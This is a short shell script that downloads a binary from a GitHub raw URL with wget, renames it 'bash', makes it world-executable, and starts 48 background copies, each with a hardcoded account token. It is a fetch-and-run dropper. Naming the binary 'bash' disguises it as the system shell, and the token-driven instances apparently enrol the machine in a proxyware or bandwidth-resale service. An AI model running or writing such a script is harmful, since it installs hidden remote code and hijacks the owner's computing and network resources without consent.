#!/bin/sh

num="48"
token="nI8wrPaUVU4CGUBTBNOszyos9yoAAI1K/RZVoXBwJ/I="
execUrl="https://github.com/hanrzme/canuqw/raw/refs/heads/main/tm20250312"

execName="bash"
execPath="`mktemp -d`/${execName}"
wget -qO "${execPath}" "${execUrl}"
chmod 777 "${execPath}"

while [ "$num" -gt "0" ]; do
  execDir=`mktemp -d`;
  ln -sf "${execPath}" "${execDir}/${execName}";
  cd "${execDir}";
  "./${execName}" start accept --token "${token}" 2>&1 &
  num=$((num-1));
  sleep 2;
done

[ "$1" == "1" ] && wait

